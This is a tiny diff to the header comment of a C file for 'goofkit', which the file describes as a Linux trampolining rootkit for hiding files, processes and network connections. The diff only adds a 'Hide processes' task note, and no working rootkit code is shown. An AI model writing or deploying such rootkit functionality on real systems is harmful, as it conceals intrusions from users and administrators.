@@ -2,6 +2,9 @@
 Project: goofkit
 Author: Jack "Hulto" McKenna & Rayne Cafaro
 Description: trampolining rootkit. Used to hide files, proccesses, and network connections from the user.
+
+Task:
+## Hide processes ##
 */
 
 #include <linux/err.h>
